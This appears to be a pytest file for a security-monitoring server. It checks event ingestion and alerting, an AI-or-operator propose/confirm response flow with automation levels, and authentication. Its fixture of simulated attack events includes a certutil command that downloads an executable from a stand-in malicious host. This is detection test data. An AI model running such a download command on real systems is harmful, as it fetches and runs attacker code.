from __future__ import annotations

from argos import get_config
from argos.config import SwitchLevel
from argos.ocsf import EventCategory, OcsfEvent, Severity
from argos.server import create_app
from fastapi.testclient import TestClient


def make_client(tmp_path, require_auth=False):
    cfg = get_config()
    cfg.data_dir = tmp_path / "data"
    cfg.data_dir.mkdir(parents=True, exist_ok=True)
    cfg.require_auth = require_auth
    app = create_app(cfg)
    return TestClient(app)


def malicious_events(host="h1"):
    return [
        OcsfEvent(category=EventCategory.PROCESS, host=host, source="test",
                  process_image=r"C:\Windows\System32\certutil.exe",
                  process_cmdline="certutil.exe -urlcache -f http://evil.example/mal.exe",
                  attack_id="T1218", attack_technique="System Binary Proxy Execution").model_dump(),
        OcsfEvent(category=EventCategory.NETWORK, host=host, source="test",
                  process_image=r"C:\Windows\System32\rundll32.exe",
                  dst_ip="185.220.101.1", dst_port=443, protocol="TCP",
                  attack_id="T1071", attack_technique="Application Layer Protocol").model_dump(),
        OcsfEvent(category=EventCategory.IDENTITY, host=host, source="test",
                  user="admin", logon_result="failure", attack_id="T1110",
                  attack_technique="Brute Force", severity=Severity.MEDIUM).model_dump(),
    ]


def test_agent_to_server_detect_and_alert(tmp_path):
    with make_client(tmp_path) as c:
        r = c.post("/api/v1/ingest", json={"events": malicious_events()})
        assert r.status_code == 200
        assert r.json()["ingested"] >= 1
        alerts = c.get("/api/v1/alerts").json()
        assert len(alerts) >= 1
        assert any(a.get("severity") in ("high", "critical") for a in alerts)


def test_propose_confirm_flow_semi_auto(tmp_path):
    with make_client(tmp_path) as c:
        ctx = c.app.state.ctx
        ctx.response.set_level(SwitchLevel.SEMI_AUTO)
        # kill_process no es auto-ejecutable en SEMI_AUTO -> queda pendiente
        r = c.post("/api/v1/propose",
                   json={"action": "kill_process", "target": "1234", "proposed_by": "test"})
        assert r.status_code == 200
        body = r.json()
        assert body["status"] == "pending"
        pid = body["id"]
        rc = c.post("/api/v1/confirm", json={"id": pid, "approved_by": "op"})
        assert rc.status_code == 200
        assert rc.json()["status"] == "executed"


def test_auto_execute_block_ip_semi_auto(tmp_path):
    with make_client(tmp_path) as c:
        ctx = c.app.state.ctx
        ctx.response.set_level(SwitchLevel.SEMI_AUTO)
        r = c.post("/api/v1/propose",
                   json={"action": "block_ip", "target": "185.220.101.1", "proposed_by": "ai"})
        assert r.status_code == 200
        # block_ip es de bajo riesgo -> se ejecuta automaticamente en SEMI_AUTO
        assert r.json()["status"] == "executed"


def test_observe_denies_proposal(tmp_path):
    with make_client(tmp_path) as c:
        ctx = c.app.state.ctx
        ctx.response.set_level(SwitchLevel.OBSERVE)
        r = c.post("/api/v1/propose",
                   json={"action": "block_ip", "target": "1.2.3.4", "proposed_by": "ai"})
        assert r.status_code == 200
        assert r.json()["status"] == "denied"


def test_auth_required_when_enabled(tmp_path):
    with make_client(tmp_path, require_auth=True) as c:
        r = c.get("/api/v1/alerts")
        assert r.status_code == 401
        # health es publico
        assert c.get("/api/v1/health").status_code == 200
